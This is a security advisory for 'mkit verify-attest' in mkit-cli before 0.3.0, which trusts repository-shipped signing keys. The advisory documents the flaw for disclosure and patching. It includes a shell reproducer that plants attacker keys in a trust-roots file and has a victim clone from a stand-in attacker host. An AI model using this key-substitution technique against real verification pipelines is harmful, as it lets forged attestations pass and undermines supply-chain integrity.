# GHSA-002 — `mkit verify-attest` defaults to in-repo trust-roots, accepting attacker-shipped keys

| | |
|---|---|
| **Severity** | High |
| **CVSS v3.1** | 7.5 (`AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`) — local attack vector with user interaction, integrity impact only (verification produces "ok" against attacker keys). |
| **Affected** | `mkit-cli` `< 0.3.0` |
| **Patched in** | `0.3.0` |
| **CWE** | CWE-345 (Insufficient Verification of Data Authenticity), CWE-1188 (Insecure Default Initialization of Resource) |
| **Discoverer** | mkit maintainers, internal review |

## Summary

`mkit verify-attest` resolves its trust-roots file (the list of
public keys that may sign attestations) from
`<repo>/.mkit/attest-trust-roots.toml` by default. A hostile clone
can ship its own trust-roots listing attacker-controlled public
keys; running `mkit verify-attest` in that clone prints
`ok: all attestations verified` against attestations the attacker
also produced.

This is an **integrity bypass**, not a key-theft or
code-execution vulnerability. It defeats the property
`mkit verify-attest` exists to provide: "this commit's attestations
were signed by a key the operator trusts."

## Affected behaviour

Any flow that runs `mkit verify-attest` without an explicit
`--trust-roots <path>` flag, in a directory containing a hostile
`.mkit/attest-trust-roots.toml`. Common cases:

- CI that clones a repository and runs `mkit verify-attest` to gate
  a deployment on attestation validity.
- Reviewers who clone a contributor's branch and check
  attestations as part of triage.

## Reproducer

```sh
# Attacker
mkdir poisoned && cd poisoned
mkit init
# Generate an attacker-controlled key + attestation as if the
# attacker owned the repo's signing identity.
mkit keygen
mkit add . && mkit commit -m "trojan"
mkit attest --predicate-type https://example.com/lie/v1
# Pin attacker pubkey as the only trust root.
mkit keygen --print-pubkey > /tmp/atk-pub
cat > .mkit/attest-trust-roots.toml <<EOF
[[trust_root]]
keyid = "ed25519:$(grep -o 'ed25519:.*' /tmp/atk-pub | sed 's/ed25519://')"
kind  = "ed25519"
pubkey_hex = "..."
EOF

# Victim
git clone https://attacker.example.com/poisoned
cd poisoned
mkit verify-attest    # prints "ok: all attestations verified"
```

## Mitigation in 0.3.0

`mkit verify-attest` now defaults to
`$XDG_CONFIG_HOME/mkit/trust-roots.toml` (default
`~/.config/mkit/trust-roots.toml`). The user owns this file; a
clone cannot influence it.

If `--trust-roots <path>` is passed explicitly, the user's intent
wins and any path is accepted (CI flows can pin a specific file).
Without the flag, an in-repo path is **refused** with:

```
refusing to use in-repo trust-roots at <path> — pass `--trust-roots`
explicitly or move the file to /home/<user>/.config/mkit/trust-roots.toml
```

A missing user-scoped file emits a stderr note and proceeds with an
empty registry, which fails verification cleanly.

## Workarounds for users on `< 0.3.0`

- **Always pass `--trust-roots` explicitly** to point at a file you
  control, never one that lives inside the clone you are verifying.
- Treat any "verified" output from `mkit verify-attest` in an
  unaudited clone as untrustworthy on `< 0.3.0`.

## Credit

Found in-house during the 0.3.0 hardening review.

## References

- Patch: <https://github.com/officialunofficial/mkit/pull/91>
- Threat model §"Trust-roots scope": `docs/THREAT-MODEL.md`
